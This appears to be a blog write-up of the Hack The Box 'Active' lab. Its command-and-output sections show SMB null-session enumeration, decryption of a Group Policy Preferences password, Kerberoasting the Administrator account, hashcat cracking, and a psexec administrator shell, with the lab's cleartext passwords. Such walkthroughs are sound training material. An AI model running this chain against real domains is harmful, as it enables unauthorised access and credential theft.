---
layout: single
title: Active - Hack The Box
excerpt: Active is an easy Windows machine, which features two very prevalent techniques to gain privileges within an Active Directory environment
date: 2025-01-30
classes: wide
header:
  teaser: /assets/images/
  teaser_home_page: true
  icon: /assets/images/hackthebox.png
categories:
  - hackthebox
tags:
  - Active Directory
  - Kerberoasting
  - GPO
---

## Summary

Active is an easy Windows machine, which features two very prevalent techniques to gain privileges within an Active Directory environment. 

## Box Details

<img src="/assets/images/active/active-logo.png">

- OS: Windows
- Difficulty: Easy

## Scanning

- nmap service and version scan

```
$ sudo nmap -sC -sV -A -p- --min-rate 10000 10.129.37.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 12:11 CST
Warning: 10.129.37.20 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.37.20
Host is up (0.081s latency).
Not shown: 65489 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-30 18:12:03Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
531/tcp   filtered conference
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
1136/tcp  filtered hhb-gateway
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5722/tcp  open     msrpc         Microsoft Windows RPC
9389/tcp  open     mc-nmf        .NET Message Framing
11059/tcp filtered unknown
13974/tcp filtered unknown
14465/tcp filtered unknown
21253/tcp filtered unknown
24557/tcp filtered unknown
26034/tcp filtered unknown
27573/tcp filtered unknown
28986/tcp filtered unknown
30742/tcp filtered unknown
34664/tcp filtered unknown
42373/tcp filtered unknown
42647/tcp filtered unknown
43748/tcp filtered unknown
45077/tcp filtered unknown
45342/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open     msrpc         Microsoft Windows RPC
49153/tcp open     msrpc         Microsoft Windows RPC
49154/tcp open     msrpc         Microsoft Windows RPC
49155/tcp open     msrpc         Microsoft Windows RPC
49157/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open     msrpc         Microsoft Windows RPC
49162/tcp open     msrpc         Microsoft Windows RPC
49166/tcp open     msrpc         Microsoft Windows RPC
49169/tcp open     msrpc         Microsoft Windows RPC
49281/tcp filtered unknown
53616/tcp filtered unknown
54677/tcp filtered unknown
57780/tcp filtered unknown
60915/tcp filtered unknown
65278/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/30%OT=53%CT=1%CU=33647%PV=Y%DS=2%DC=T%G=Y%TM=679B
OS:C140%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=I%CI=I%TS=7)SEQ(S
OS:P=102%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M53CNW8ST11%O2=M53CN
OS:W8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)WIN(W1=
OS:2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=
OS:M53CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-30T18:13:12
|_  start_date: 2025-01-30T18:02:24
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   74.59 ms 10.10.14.1
2   84.46 ms 10.129.37.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.07 seconds
```

##  Enumeration

### 445 SMB

We could list available shares with a null session. And we can access the `Replication` share

```
smbmap -u '' -p '' -H 10.129.37.20
[+] IP: 10.129.37.20:445  Name: active.htb                                        
        Disk                                                    Permissions Comment
  ----                                                    ----------- -------
  ADMIN$                                              NO ACCESS Remote Admin
  C$                                                  NO ACCESS Default share
  IPC$                                                NO ACCESS Remote IPC
  NETLOGON                                            NO ACCESS Logon server share 
  Replication                                         READ ONLY 
  SYSVOL                                              NO ACCESS Logon server share 
  Users                                               NO ACCESS
```

Using `smbmap` to spider the available share, I found a `Group.xml` file which I downloaded to my local machine

```
$ smbmap -u '' -p '' -H 10.129.37.20 -s Replication -R --depth 10
[+] IP: 10.129.37.20:445  Name: active.htb                                        
        Disk                                                    Permissions Comment
  ----                                                    ----------- -------
  ADMIN$                                              NO ACCESS Remote Admin
  C$                                                  NO ACCESS Default share
  IPC$                                                NO ACCESS Remote IPC
  NETLOGON                                            NO ACCESS Logon server share 
  Replication                                         READ ONLY 
  .\Replication\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  active.htb
  .\Replication\active.htb\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  DfsrPrivate
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  Policies
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  scripts
  .\Replication\active.htb\DfsrPrivate\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ConflictAndDeleted
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  Deleted
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  Installing
  .\Replication\active.htb\Policies\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  {31B2F340-016D-11D2-945F-00C04FB984F9}
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  {6AC1786C-016F-11D2-945F-00C04fB984F9}
  .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  fr--r--r--               23 Sat Jul 21 05:38:11 2018  GPT.INI
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  Group Policy
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  MACHINE
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  USER
  .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  fr--r--r--              119 Sat Jul 21 05:38:11 2018  GPE.INI
  .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  Microsoft
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  Preferences
  fr--r--r--             2788 Sat Jul 21 05:38:11 2018  Registry.pol
  .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  Windows NT
  .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  SecEdit
  .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  fr--r--r--             1098 Sat Jul 21 05:38:11 2018  GptTmpl.inf
  .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  Groups
  .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  fr--r--r--              533 Sat Jul 21 05:38:11 2018  Groups.xml
  .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  fr--r--r--               22 Sat Jul 21 05:38:11 2018  GPT.INI
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  MACHINE
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  USER
  .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  Microsoft
  .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  Windows NT
  .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  SecEdit
  .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\*
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  .
  dr--r--r--                0 Sat Jul 21 05:37:44 2018  ..
  fr--r--r--             3722 Sat Jul 21 05:38:11 2018  GptTmpl.inf
  SYSVOL                                              NO ACCESS Logon server share 
  Users                                               NO ACCESS
```

Downloading the file using `smbmap`

```
smbmap -u '' -p '' -H 10.129.37.20 -s Replication --download '.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml'
[+] Starting download: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml (533 bytes)
[+] File output to: /home/ricobandy/10.129.37.20-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml
```

This is a GPO file created on the system and this sometimes contains an account and it's encrypted password

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

## Getting User flag

We can decrypt this password by using the `gpp-decrypt` tool

```
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

And now able to get the user flag connecting through SMB

```
$ smbclient -U SVC_TGS \\\\10.129.37.20\\Users
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> cd SVC_TGS\Desktop\

smb: \SVC_TGS\Desktop\> dir
  .                                   D        0  Sat Jul 21 10:14:42 2018
  ..                                  D        0  Sat Jul 21 10:14:42 2018
  user.txt                           AR       34  Thu Jan 30 12:03:27 2025

    5217023 blocks of size 4096. 279461 blocks available
smb: \SVC_TGS\Desktop\> get user.txt 
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> exit
$ cat user.txt 
5f20adb4816e7bfee74327568da70563
```

## Privilege Escalation

To escalate our privileges on the box, I retrieved all users on the system

```
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.129.37.20
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Querying 10.129.37.20 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 14:06:40.351723  2025-01-30 12:03:29.362551 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 13:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 15:14:38.402764  2018-07-21 09:01:30.320277
```

With this box being a domain controller, I checked if I could find any user being kerberoastable and found that the `Administrator` user is vulnerable to kerberoasting as it is configured with SPN, hence we can request a TGS and extract the hash for offline cracking

```
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.37.20 
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2025-01-30 12:03:29.362551 
```

Requesting for TGS

```
$ GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.37.20  -request
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2025-01-30 12:03:29.362551             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$91ea414aec2c3ef5dc58f0ff6152e808$0a2d93ecc729d452ae3b496dfff6f9828bfdd76b91d16c86201b6fd973089ee56333345335fd9bbfb56aa00c178d43a41dad73e5ccdb41caee06ade6f583619aa8bf9bc2dcc546658141b7bdf321a3301b13876de1958a39bcf2517dc839bde545d5f70e1bd31eaada209f2f2920385a6208364571ad3d209c6bcd9bff1e932febc723a5e448e6417ab4e3e220cdff62565cb8091d77f5f1639beab13c90d01396c57e84ee73067477452df8e6f0c4692c4eadf64acef9eae141a5b8b7b14ea715e2b31f306ed80e9c6fe665b056216ecd0d71e17f6abfd516ff8580c1dcbaae98786e5ba5c197253c5f72f2ba76b5422c86f09cab115309dbb10983bcdfbbdcee965649e7387a6477d8fd195ac9983e9e417d08e3dfc647192b9692b30dd22711976112e5433d184fb6543a7e77139a4e814fa9bc6673b046375fc85c3d9f9ecfa090baf7e7f0aab06841694873bf1c48bae19ea22927aac966691104b40b2364d56373f26ede55604bbca487ffbd2a54f5e65add269b548ec6adfa09a148774a856f1f7fe4b810d464a0f3a54fa37202ed81fd06ab66034d4c08d5a96999c7d10d8c0e0b91a6eae0c34b38ed43c97c8cb8d20f562d45449ff4a7090e7d764c6673026737015f32f2d717f2376670f17b3e664f97db7f04014a9bd4470a7d016cc7e7eedff3db51b599a80bfe4970228570153e1c4a400220de7d5df4a758b088869f7d9234e31ab0c449fa71f0fe2c928f72897d5403b88f59615e4fac4965409992b8879ded7b7f89eaf6c81257e04e5027ac5dc662cadce2a15b83e3d164f103b20c2c80679317cd291342d79f8baaa6233be58e8ff5746786b11e18ecd2b4da76012b2a319f1edbf78c201b3ede840b3430a07a8aa8997c41a9f27e0c72273992d2ef0d2b3d04b30ed5f4fa8039759e4a387b1621f2c6c6b01f76e2901fe228ed56e6872dc79cb95d1a3bb2eb8b8613f1e76eda8e123ba43247bedf86853ce1cf1dd7c598f9d5f742f8fc3938d3f816a620a02b52e720808948d1cb286efff0bc3928222d5430ff067d916af8ebe9574281f559a0f15a2f47f8f18378d0078016b1ba8ebdd4e4a6d0d5e0d890e01cb6b7b915d97b524168916f48c9633205898f524401fef3e7ba201e1ca54112f71fdd6e83683841cf35b22f9820d4b4b9b0ef1100759b59c2e92af019a7b38d985588d2279d2ec56fbb67bc26e5c5b2534f3c2763eff596fff9a51273b60d0a0390cab01a7d64746cc1
```

Using hashcat, I'm able to crack the hash and reveal the password:
  - hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
  - Administrator:Ticketmaster1968

```
$ hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$91ea414aec2c3ef5dc58f0ff6152e808$0a2d93ecc729d452ae3b496dfff6f9828bfdd76b91d16c86201b6fd973089ee56333345335fd9bbfb56aa00c178d43a41dad73e5ccdb41caee06ade6f583619aa8bf9bc2dcc546658141b7bdf321a3301b13876de1958a39bcf2517dc839bde545d5f70e1bd31eaada209f2f2920385a6208364571ad3d209c6bcd9bff1e932febc723a5e448e6417ab4e3e220cdff62565cb8091d77f5f1639beab13c90d01396c57e84ee73067477452df8e6f0c4692c4eadf64acef9eae141a5b8b7b14ea715e2b31f306ed80e9c6fe665b056216ecd0d71e17f6abfd516ff8580c1dcbaae98786e5ba5c197253c5f72f2ba76b5422c86f09cab115309dbb10983bcdfbbdcee965649e7387a6477d8fd195ac9983e9e417d08e3dfc647192b9692b30dd22711976112e5433d184fb6543a7e77139a4e814fa9bc6673b046375fc85c3d9f9ecfa090baf7e7f0aab06841694873bf1c48bae19ea22927aac966691104b40b2364d56373f26ede55604bbca487ffbd2a54f5e65add269b548ec6adfa09a148774a856f1f7fe4b810d464a0f3a54fa37202ed81fd06ab66034d4c08d5a96999c7d10d8c0e0b91a6eae0c34b38ed43c97c8cb8d20f562d45449ff4a7090e7d764c6673026737015f32f2d717f2376670f17b3e664f97db7f04014a9bd4470a7d016cc7e7eedff3db51b599a80bfe4970228570153e1c4a400220de7d5df4a758b088869f7d9234e31ab0c449fa71f0fe2c928f72897d5403b88f59615e4fac4965409992b8879ded7b7f89eaf6c81257e04e5027ac5dc662cadce2a15b83e3d164f103b20c2c80679317cd291342d79f8baaa6233be58e8ff5746786b11e18ecd2b4da76012b2a319f1edbf78c201b3ede840b3430a07a8aa8997c41a9f27e0c72273992d2ef0d2b3d04b30ed5f4fa8039759e4a387b1621f2c6c6b01f76e2901fe228ed56e6872dc79cb95d1a3bb2eb8b8613f1e76eda8e123ba43247bedf86853ce1cf1dd7c598f9d5f742f8fc3938d3f816a620a02b52e720808948d1cb286efff0bc3928222d5430ff067d916af8ebe9574281f559a0f15a2f47f8f18378d0078016b1ba8ebdd4e4a6d0d5e0d890e01cb6b7b915d97b524168916f48c9633205898f524401fef3e7ba201e1ca54112f71fdd6e83683841cf35b22f9820d4b4b9b0ef1100759b59c2e92af019a7b38d985588d2279d2ec56fbb67bc26e5c5b2534f3c2763eff596fff9a51273b60d0a0390cab01a7d64746cc1:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...746cc1
Time.Started.....: Sat Feb 15 12:06:49 2025 (5 secs)
Time.Estimated...: Sat Feb 15 12:06:54 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1860.3 kH/s (0.84ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: Tiffany95 -> Thelittlemermaid

Started: Sat Feb 15 12:06:39 2025
Stopped: Sat Feb 15 12:06:56 2025

```

Using `psexec.py` I was able to login as administrator to the box and retrieve the root flag

```
$ psexec.py administrator@10.129.37.20
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.129.37.20.....
[*] Found writable share ADMIN$
[*] Uploading file oAUdEoJO.exe
[*] Opening SVCManager on 10.129.37.20.....
[*] Creating service tStq on 10.129.37.20.....
[*] Starting service tStq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> cd ..\..
C:\> cd Users\Administrator
C:\Users\Administrator> cd Desktop
C:\Users\Administrator\Desktop> 

C:\Users\Administrator\Desktop> type root.txt
a7666588875157821b74a54202ae7659

C:\Users\Administrator\Desktop> 
```



